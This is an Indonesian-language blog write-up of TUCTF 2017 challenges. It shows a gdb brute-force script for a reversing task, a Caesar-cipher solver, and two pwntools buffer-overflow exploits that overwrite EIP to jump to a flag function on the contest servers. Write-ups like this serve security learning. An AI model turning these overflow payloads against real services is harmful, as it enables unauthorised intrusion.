@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>TUCTF 2017 - Writeup :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Reversing 200 (Unknown) Diberikan file ELF 64 bit stripped.
+Berikut hasil disassembly fungsi main
+signed __int64 __fastcall main(int a1, char **a2, char **a3) { signed __int64 result; // rax@2  unsigned int i; // [sp&#43;14h] [bp-Ch]@5  char *v5; // [sp&#43;18h] [bp-8h]@5  if ( a1 == 2 ) { if ( strlen(a2[1]) == 56 ) { v5 = a2[1]; for ( i = 0; i &amp;lt; 0x38; &#43;&#43;i ) { if ( (unsigned int)sub_401E90((__int64)v5, i) ) dword_603084 = 1; } if ( dword_603084 ) puts(&amp;#34;Nope."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2017-11-27-tuctf-2017/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TUCTF 2017 - Writeup"/>
+<meta name="twitter:description" content="Reversing 200 (Unknown) Diberikan file ELF 64 bit stripped.
+Berikut hasil disassembly fungsi main
+signed __int64 __fastcall main(int a1, char **a2, char **a3) { signed __int64 result; // rax@2  unsigned int i; // [sp&#43;14h] [bp-Ch]@5  char *v5; // [sp&#43;18h] [bp-8h]@5  if ( a1 == 2 ) { if ( strlen(a2[1]) == 56 ) { v5 = a2[1]; for ( i = 0; i &lt; 0x38; &#43;&#43;i ) { if ( (unsigned int)sub_401E90((__int64)v5, i) ) dword_603084 = 1; } if ( dword_603084 ) puts(&#34;Nope."/>
+
+
+
+<meta property="og:title" content="TUCTF 2017 - Writeup" />
+<meta property="og:description" content="Reversing 200 (Unknown) Diberikan file ELF 64 bit stripped.
+Berikut hasil disassembly fungsi main
+signed __int64 __fastcall main(int a1, char **a2, char **a3) { signed __int64 result; // rax@2  unsigned int i; // [sp&#43;14h] [bp-Ch]@5  char *v5; // [sp&#43;18h] [bp-8h]@5  if ( a1 == 2 ) { if ( strlen(a2[1]) == 56 ) { v5 = a2[1]; for ( i = 0; i &lt; 0x38; &#43;&#43;i ) { if ( (unsigned int)sub_401E90((__int64)v5, i) ) dword_603084 = 1; } if ( dword_603084 ) puts(&#34;Nope." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2017-11-27-tuctf-2017/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2017-11-27-tuctf-2017/">TUCTF 2017 - Writeup</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by Aiden Pearce</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/tuctf2017/">tuctf2017</a>&nbsp;
+        
+          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/ctf.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <h2 id="reversing-200-unknown">Reversing 200 (Unknown)</h2>
+<p>Diberikan file ELF 64 bit stripped.</p>
+<p>Berikut hasil disassembly fungsi main</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax@2
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+14h] [bp-Ch]@5
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// [sp+18h] [bp-8h]@5
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">if</span> ( a1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
+  {
+    <span style="color:#66d9ef">if</span> ( strlen(a2[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">56</span> )
+    {
+      v5 <span style="color:#f92672">=</span> a2[<span style="color:#ae81ff">1</span>];
+      <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x38</span>; <span style="color:#f92672">++</span>i )
+      {
+        <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sub_401E90((<span style="color:#66d9ef">__int64</span>)v5, i) )
+          dword_603084 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+      }
+      <span style="color:#66d9ef">if</span> ( dword_603084 )
+        puts(<span style="color:#e6db74">&#34;Nope.&#34;</span>);
+      <span style="color:#66d9ef">else</span>
+        printf(<span style="color:#e6db74">&#34;Congraz the flag is: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v5, a2);
+      result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+    }
+    <span style="color:#66d9ef">else</span>
+    {
+      puts(<span style="color:#e6db74">&#34;Still nope.&#34;</span>);
+      result <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967294LL</span>;
+    }
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    puts(<span style="color:#e6db74">&#34;Try again.&#34;</span>);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFFLL</span>;
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>Dari Pseudo-C diatas diketahui program membutuhkan <code>args</code> dan panjang nya <code>56 bytes</code>.</p>
+<p>fungsi <code>sub_401E90</code> akan memproses inputan, dan inputan di proses byte per byte hingga 56, dan <code>dword_603084</code> adalah global variable yang di set ke nilai <code>True</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x38</span>; <span style="color:#f92672">++</span>i )
+      {
+        <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sub_401E90((<span style="color:#66d9ef">__int64</span>)v5, i) )
+          dword_603084 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+      }
+</code></pre></div><p>saat mencoba membaca hasil Pseodo-C fungsi <code>sub_401E90</code>, saya sama sekali tidak mengerti proses apaan itu *ribet :v karena banyak fungsi-fungsi lain yang dipanggil lagi.</p>
+<p>Percobaan debug menggunakan <code>gdb</code>, yang dimana nilai hasil proses fungsi <code>sub_401E90</code>, <code>eax</code> akan bernilai <code>0x0</code> apabila byte inputan benar, dan  akan bernilai <code>0x1</code> apabila byte inputan salah.</p>
+<p>Snippet decompile</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">   <span style="color:#960050;background-color:#1e0010">0</span>x401c7d:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x401e90</span>
+   <span style="color:#960050;background-color:#1e0010">0</span>x401c82:	<span style="color:#a6e22e">test</span>   <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+   <span style="color:#960050;background-color:#1e0010">0</span>x401c84:	<span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">0x401c90</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">b</span> *<span style="color:#ae81ff">0x0000000000401c82</span>
+<span style="color:#a6e22e">Breakpoint</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">at</span> <span style="color:#ae81ff">0x401c82</span>
+<span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">r</span> <span style="color:#66d9ef">TUCTF</span><span style="color:#960050;background-color:#1e0010">{</span><span style="color:#66d9ef">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">p</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">x</span> <span style="color:#66d9ef">$rax</span>
+<span style="color:#a6e22e">$3</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">r</span> <span style="color:#66d9ef">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span style="color:#a6e22e">gdb-peda$</span> <span style="color:#66d9ef">p</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">x</span> <span style="color:#66d9ef">$rax</span>
+<span style="color:#a6e22e">$3</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">0x1</span>
+</code></pre></div><p>Karena inputan di proses, byte-per-byte, saya mencoba input dengan prefix &ldquo;TUCTF{&rdquo; sehingga nilai <code>eax</code> akan bernilai <code>0x0</code> dalam 6 kali iterasi, dan selanjutkan <code>eax</code> akan bernilai <code>0x1</code> karena <code>&quot;A&quot;*50</code> bukan byte-byte yang benar. Dari sini kita bisa melakukan <em>Brute Force</em> setiap kemungkinan byte yang benar.</p>
+<p>Berikut script yang saya gunakan untuk melakukan brute force</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> gdb
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+char_set <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!_}&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TUCTF{&#34;</span>
+
+gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;b *0x0000000000401c82&#34;</span>)
+
+<span style="color:#66d9ef">while</span> True:
+	<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> char_set:
+		pattern <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">55</span><span style="color:#f92672">-</span>len(flag))
+		gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;r {}&#34;</span><span style="color:#f92672">.</span>format(pattern))
+		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag)):
+			gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;c&#34;</span>)
+		rax <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;p/x $rax&#34;</span>,True,True)<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+		<span style="color:#66d9ef">if</span> rax <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;0x0&#34;</span>:
+		 	flag <span style="color:#f92672">+=</span> c
+		 	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;}&#34;</span> <span style="color:#f92672">in</span> flag:
+		 		<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Flag : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (flag))
+		 		exit(<span style="color:#ae81ff">0</span>)
+		 	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Curret Flag : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (flag))
+		 	sleep(<span style="color:#ae81ff">1</span>)
+		 	<span style="color:#66d9ef">break</span>
+		<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Pattern : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (pattern))
+		<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Nilai Rax : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (rax))	
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb -x unk.py -q unknown --nh --batch
+</code></pre></div><p>Setelah menunggu beberapa lama, akan mendapatkan Flag</p>
+<h3 id="flag--tuctfw3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6">Flag : TUCTF{w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!}</h3>
+<h2 id="pwn-50-vuln-chat">Pwn 50 (Vuln-chat)</h2>
+<p><em>Classic Buffer Overflow</em> yang dimana meng overwrite <em>Local Variable</em> dengan &ldquo;%s&rdquo; agar pada bagian form &ldquo;Enter your username&rdquo; tidak dibatasi dan bisa meoverwrite <code>EIP</code> dan arahkan ke fungsi <code>printFlag</code>.</p>
+<p>Berikut script yang saya gunakan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+vuln <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;vulnchat.tuctf.com&#34;</span>,<span style="color:#ae81ff">4141</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00007325</span>) <span style="color:#75715e"># overwrite with &#34;%s&#34;</span>
+vuln<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Enter your username: &#34;</span>,payload)
+payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">49</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x804856b</span>)
+vuln<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;: &#34;</span>,payload2)
+<span style="color:#66d9ef">print</span> vuln<span style="color:#f92672">.</span>recvall()
+</code></pre></div><h2 id="pwn-100-vuln-chat20">Pwn 100 (Vuln-chat2.0)</h2>
+<p><em>Classic Buffer Overflow</em> yang dimana mengoverwrite nilai <code>EIP</code>, tetapi kita hanya membutuhkan 1 byte address dari fungsi <code>printFlag</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72</span><span style="color:#e6db74">&#34;</span>
+vuln2 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;vulnchat2.tuctf.com&#34;</span>, <span style="color:#ae81ff">4242</span>)
+vuln2<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Enter your username: &#34;</span>,<span style="color:#e6db74">&#34;AAAA&#34;</span>)
+vuln2<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;AAAA: &#34;</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">43</span> <span style="color:#f92672">+</span> flag
+vuln2<span style="color:#f92672">.</span>send(payload)
+<span style="color:#66d9ef">print</span> vuln2<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</code></pre></div><h2 id="crypto-50-the-never-ending-crypto">Crypto 50 (The Never Ending Crypto)</h2>
+<p>Crypto 50 sebenar nya hanya <code>Caesar Cipher</code></p>
+<p>Berikut script yang saya gunakan untuk melakukan decrypt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> string
+
+never <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;neverending.tuctf.com&#34;</span>,<span style="color:#ae81ff">12345</span>)
+char_set <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">#$%&amp;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">()*+,-./:;&lt;=&gt;?@[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">]^_`{|}~\s&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">round1</span>(char<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A&#34;</span>):
+	never<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;text:&#34;</span>,char)
+	enc_base <span style="color:#f92672">=</span> never<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;is &#34;</span>)[<span style="color:#ae81ff">1</span>]
+	enc_msg <span style="color:#f92672">=</span> never<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;is &#34;</span>)[<span style="color:#ae81ff">1</span>]
+	enc_msg <span style="color:#f92672">=</span> enc_msg<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; decrypted?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ENC BASE : -&gt; {}&#34;</span><span style="color:#f92672">.</span>format(enc_base))
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ENC MSG : -&gt; {}&#34;</span><span style="color:#f92672">.</span>format(enc_msg))
+	cal <span style="color:#f92672">=</span> ord(char) <span style="color:#f92672">-</span> ord(enc_base[<span style="color:#ae81ff">0</span>])
+	dec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(ord(b) <span style="color:#f92672">+</span> cal) <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> enc_msg])
+	
+	non_printable <span style="color:#f92672">=</span> [ chr(ord(z)) <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> dec <span style="color:#66d9ef">if</span> z <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> char_set]
+	printable <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ chr(ord(z)<span style="color:#f92672">+</span><span style="color:#ae81ff">95</span>) <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> non_printable <span style="color:#66d9ef">if</span> z <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> char_set])
+	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(printable)):
+	    dec <span style="color:#f92672">=</span> dec<span style="color:#f92672">.</span>replace(non_printable[i],printable[i])
+
+	non_printable2 <span style="color:#f92672">=</span> [ chr(ord(z)) <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> dec <span style="color:#66d9ef">if</span> z <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> char_set]
+	printable2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ chr(ord(z)<span style="color:#f92672">-</span><span style="color:#ae81ff">190</span>) <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> non_printable2 <span style="color:#66d9ef">if</span> z <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> char_set])
+	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(printable2)):
+	    dec <span style="color:#f92672">=</span> dec<span style="color:#f92672">.</span>replace(non_printable2[i],printable2[i])
+
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Decrypted -&gt; {}&#34;</span><span style="color:#f92672">.</span>format(repr(dec)))
+	never<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>,dec)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+	<span style="color:#66d9ef">try</span>:
+		log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Round {0}&#34;</span><span style="color:#f92672">.</span>format(i))
+		round1()
+		<span style="color:#66d9ef">if</span> never<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Correct!&#34;</span>:
+			log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;-&gt; BENAR&#34;</span>)
+			<span style="color:#66d9ef">continue</span>
+		log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;-&gt; SALAH&#34;</span>)
+	<span style="color:#66d9ef">except</span>:
+		<span style="color:#66d9ef">print</span> never<span style="color:#f92672">.</span>recv()
+		never<span style="color:#f92672">.</span>close()
+		<span style="color:#66d9ef">break</span>
+</code></pre></div><p>Pada Round 50 akan mendatkan Flag.</p>
+<h3 id="flag--tuctfwh0_ws_her3_la5t_yer">Flag : TUCTF{wh0_w@s_her3_la5t_ye@r?!?}</h3>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2017-12-1-tuctf-2017/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">TUCTF 2017 - Write up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2017-11-06-cyber-jawara-2017/">
+                  <span class="button__text">Write Up Cyber Jawara 2017</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
